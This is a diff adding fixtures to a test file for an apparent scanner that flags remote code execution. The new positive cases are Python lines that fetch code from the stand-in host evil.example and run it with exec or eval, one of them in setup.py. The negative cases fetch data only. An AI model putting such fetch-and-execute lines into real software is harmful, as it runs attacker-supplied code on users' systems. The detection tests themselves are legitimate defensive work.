@@ -283,6 +283,14 @@ test("code fetched from the network and executed in-process is unsafe execution"
     ],
     [
       "tools/run.py",
+      "import httpx\nexec(httpx.get('https://evil.example/x.py').text)\n",
+    ],
+    [
+      "setup.py",
+      "import httpx\neval(httpx.post('https://evil.example/x.py', data=payload).text)\n",
+    ],
+    [
+      "tools/run.py",
       "import urllib.request\nexec(urllib.request.urlopen('https://evil.example/x.py').read())\n",
     ],
     [
@@ -320,6 +328,14 @@ test("fetching data without executing it keeps no unsafe-execution finding", () 
     [
       "tools/run.py",
       "import requests\nprint(requests.get('https://example.com/data.json').json())\n",
+    ],
+    [
+      "tools/run.py",
+      "import httpx\nprint(httpx.get('https://example.com/data.json').json())\n",
+    ],
+    [
+      "tools/run.py",
+      "exec(httpx.get('https://example.com/data').status_code)\n",
     ],
     // Executing a local file's text is a different act; no fetch appears
     // in the expression.
